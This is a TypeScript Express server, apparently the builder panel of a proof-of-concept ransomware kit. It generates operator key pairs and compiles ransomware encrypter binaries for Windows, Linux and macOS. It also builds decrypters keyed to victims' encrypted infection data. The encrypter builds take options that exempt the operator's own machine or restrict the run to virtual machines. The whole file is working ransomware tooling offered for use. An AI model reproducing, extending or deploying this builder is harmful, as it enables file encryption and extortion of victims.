import path from "node:path";
import { execSync } from "node:child_process";

import * as dotenv from "dotenv";
import fs from "node:fs";

dotenv.config({
  path: path.resolve(__dirname, "..", ".env"),
});

import express from "express";
import {
  modifyCurrentRootConfig,
  readCurrentRootConfig,
  setCurrentActiveRootKeyPair,
  setCurrentImmuneMachineIds,
  setRunOnVmOnlyOption,
} from "./config";
import { generateKeyPairAndSave } from "./genkey";
import {
  RANSOM_DIR_MODES,
  RansomDirMode,
  getMachineId,
  hash,
  parseEncryptedInfections,
  parseEncryptedInfectionsFile,
} from "ransomkcommon";
import fse, { PathLike } from "fs-extra";
import { generateAndSetDecryptionHashTable } from "./gendec";

const app = express();

const PORT = process.env.PORT ?? 3000 + Math.floor(Math.random() * 10000);

const ENCRYPT_PROJECT_PATH = path.join(__dirname, "..", "..", "encrypt");
const DECRYPT_PROJECT_PATH = path.join(__dirname, "..", "..", "decrypt");
const SERVER_PROJECT_PATH = path.join(__dirname, "..");
const SERVER_BIN_TMP_PATH = path.join(SERVER_PROJECT_PATH, ".tmpbin");

function* readdirSyncSafe(dir: string): Generator<string> {
  if (fs.existsSync(dir)) {
    if (fs.statSync(dir).isDirectory()) {
      for (const filePath of fs.readdirSync(dir)) {
        yield filePath;
      }
    }
  }
}

app.use(
  "/dashboard",
  express.static(path.resolve(path.join(__dirname, "..", "..", "web", "dist")))
);

app.get("/keys", (req, res) => {
  const rootConfig = readCurrentRootConfig();

  return res.json(
    Object.values(rootConfig.keys ?? {}).map((e) => e.rootPublicKey)
  );
});

app.get("/", (req, res) => {
  return res.redirect("/dashboard");
});

app.delete("/clear-cache", (req, res) => {
  if (fs.existsSync(SERVER_BIN_TMP_PATH)) {
    fs.rmSync(SERVER_BIN_TMP_PATH, { recursive: true });
  }

  return res.status(202).send();
});

app.get("/build-ransom-decrypter", async (req, res) => {
  let { payload, os } = req.query as Record<string, string>;

  payload = decodeURIComponent(payload);

  const infections = parseEncryptedInfections(payload);

  if (infections.length === 0) {
    return res.status(400).send("Invalid payload");
  }

  await generateAndSetDecryptionHashTable(infections);

  const rootConfig = readCurrentRootConfig();

  if (typeof rootConfig.keys === "undefined") {
    return res.status(400).send("User doesn't have any keys.");
  }

  if (typeof os !== "string") {
    return res.status(400).send("Missing [os] param.");
  }

  const availableSystems = ["win", "linux", "macos"];

  if (!availableSystems.includes(os)) {
    return res
      .status(400)
      .send(
        `Invalid [os] was provided: ${os}, choices are: ${availableSystems.join(
          ", "
        )}.`
      );
  }

  const fileext = (() => {
    switch (os) {
      case "win":
        return ".exe";
      case "linux":
      case "macos":
        return "";
    }
  })();

  const payloadHash = hash(payload).toString("hex");

  const binaryId = generateBinaryId(os);

  function generateBinaryId(os: string): string {
    return [payloadHash, os].join("-");
  }

  const targetFilename = binaryId + fileext;

  if (!fs.existsSync(SERVER_BIN_TMP_PATH)) {
    fs.mkdirSync(SERVER_BIN_TMP_PATH);
  }

  const targetFilePath = path.join(SERVER_BIN_TMP_PATH, targetFilename);

  if (fs.existsSync(targetFilePath)) {
    return res.sendFile(targetFilePath);
  }

  console.log(
    `Building your decrypter binary... it may take a while depending on your machine`
  );

  const stdout = execSync(`yarn build`, {
    cwd: DECRYPT_PROJECT_PATH,
  });

  if (stdout) {
    console.log({ stdout: stdout.toString("utf8") });
  }

  fse.copySync(
    path.join(DECRYPT_PROJECT_PATH, "bin"),
    path.join(SERVER_BIN_TMP_PATH)
  );

  for (const binaryFilePath of readdirSyncSafe(SERVER_BIN_TMP_PATH)) {
    if (!binaryFilePath.startsWith("rkd-")) continue;

    let [oldFilename, fileext] = binaryFilePath.split(".");

    const [oldBinName, osName] = oldFilename.split("-");

    fileext = typeof fileext === "string" ? "." + fileext : "";

    fs.renameSync(
      path.join(SERVER_BIN_TMP_PATH, binaryFilePath),
      path.join(SERVER_BIN_TMP_PATH, generateBinaryId(osName) + fileext)
    );
  }

  if (fs.existsSync(targetFilePath)) {
    return res.sendFile(targetFilePath);
  } else {
    return res.status(404).send();
  }
});

app.post("/generate-key", async (req, res) => {
  const keyPair = await generateKeyPairAndSave();

  return res.status(200).json(keyPair.rootPublicKey);
});

app.delete("/delete-key", async (req, res) => {
  const { publicKey } = req.query;

  if (typeof publicKey !== "string") {
    return res.status(400).send();
  }

  const rootConfig = readCurrentRootConfig();

  if (typeof (rootConfig.keys ?? {})[publicKey] === "undefined") {
    return res.status(404).send();
  }

  await modifyCurrentRootConfig(async (getCurrentConfig) => {
    const keys = { ...getCurrentConfig().keys };

    delete keys[publicKey];

    return {
      ...getCurrentConfig(),
      keys: keys,
    };
  });

  const publicKeyHash = hash(publicKey).toString("hex");

  for (const filename of readdirSyncSafe(SERVER_BIN_TMP_PATH)) {
    if (filename.includes(publicKeyHash)) {
      fs.rmSync(path.join(SERVER_BIN_TMP_PATH, filename));
    }
  }

  return res.status(202).send();
});

app.get("/build-ransom-encrypter", async (req, res) => {
  const { os, publicKey, mode, selfProtection } = req.query as Record<
    string,
    string
  >;

  const rootConfig = readCurrentRootConfig();

  if (typeof rootConfig.keys === "undefined") {
    return res.status(400).send("User doesn't have any keys.");
  }

  if (typeof os !== "string") {
    return res.status(400).send("Missing [os] param.");
  }

  const availableSystems = ["win", "linux", "macos"];

  if (!availableSystems.includes(os)) {
    return res
      .status(400)
      .send(
        `Invalid [os] was provided: ${os}, choices are: ${availableSystems.join(
          ", "
        )}.`
      );
  }

  if (typeof mode !== "string" || RANSOM_DIR_MODES.every((e) => e !== mode)) {
    return res
      .status(400)
      .send(
        `Invalid [mode] was provided: ${mode}, choices are: ${RANSOM_DIR_MODES.join(
          ", "
        )}.`
      );
  }

  const keyPair = rootConfig.keys[publicKey];

  if (typeof keyPair === "undefined") {
    return res.status(400).send(
      // Maybe we should avoid revealing the error reason (?)
      `The provided public key (${publicKey}) doesn't match any key.`
    );
  }

  const fileext = (() => {
    switch (os) {
      case "win":
        return ".exe";
      case "linux":
      case "macos":
        return "";
    }
  })();

  const publicKeyHash = hash(publicKey).toString("hex");

  const binaryId = generateBinaryId(mode as RansomDirMode, os);

  function generateBinaryId(mode: RansomDirMode, os: string): string {
    return [
      mode === "streamSystemDir" ? selfProtection ?? "vmonly" : "",
      mode,
      publicKeyHash,
      os,
    ].join("-");
  }

  const targetFilename = binaryId + fileext;

  const targetFilePath = path.join(SERVER_BIN_TMP_PATH, targetFilename);

  if (fs.existsSync(targetFilePath)) {
    return res.sendFile(targetFilePath);
  }

  await setCurrentActiveRootKeyPair(keyPair, mode as RansomDirMode);

  const immuneMachineIds = await (async () => {
    switch (selfProtection) {
      case undefined:
      case null:
      case "nuke":
      case "vmonly":
        return [];
      case "machineguid":
      default:
        return [await getMachineId()];
    }
  })();

  const runOnVmOnly = await (async () => {
    switch (selfProtection) {
      case "vmonly":
        return true;
      case "machineguid":
      case "nuke":
      case undefined:
      case null:
      default:
        return false;
    }
  })();

  await setCurrentImmuneMachineIds(async (_) => immuneMachineIds);

  await setRunOnVmOnlyOption(runOnVmOnly);

  if (!fs.existsSync(SERVER_BIN_TMP_PATH)) {
    fs.mkdirSync(SERVER_BIN_TMP_PATH);
  }

  console.log(
    `Building your encrypter binary... it may take a while depending on your machine`
  );

  let stdout;

  try {
    stdout = execSync(`yarn build`, {
      cwd: ENCRYPT_PROJECT_PATH,
    });
  } catch (e: any) {
    console.log({ e: e.output[1].toString("utf8") });
  }

  if (stdout) {
    console.log({ stdout: stdout.toString("hex") });
  }

  fse.copySync(
    path.join(ENCRYPT_PROJECT_PATH, "bin"),
    path.join(SERVER_BIN_TMP_PATH)
  );

  for (const binaryFilePath of readdirSyncSafe(SERVER_BIN_TMP_PATH)) {
    if (!binaryFilePath.startsWith("rke-")) continue;

    let [oldFilename, fileext] = binaryFilePath.split(".");

    const [oldBinName, osName] = oldFilename.split("-");

    fileext = typeof fileext === "string" ? "." + fileext : "";

    fs.renameSync(
      path.join(SERVER_BIN_TMP_PATH, binaryFilePath),
      path.join(
        SERVER_BIN_TMP_PATH,
        generateBinaryId(mode as RansomDirMode, osName) + fileext
      )
    );
  }

  if (fs.existsSync(targetFilePath)) {
    return res.sendFile(targetFilePath);
  } else {
    return res.status(404).send();
  }
});

app.get("/export-keys", (req, res) => {
  /** Too lazy, I'm not going to use this anyways, this is just a POC */
  return res.status(501).send();
});

app.get("/import-keys", (req, res) => {
  /** Too lazy, I'm not going to use this anyways, this is just a POC */
  return res.status(501).send();
});

app.listen(PORT, async () => {
  const localhost = `http://localhost:${PORT}`;

  console.log(`Listening on ${localhost}`);

  const { default: open } = await import("open");

  open(localhost);
});
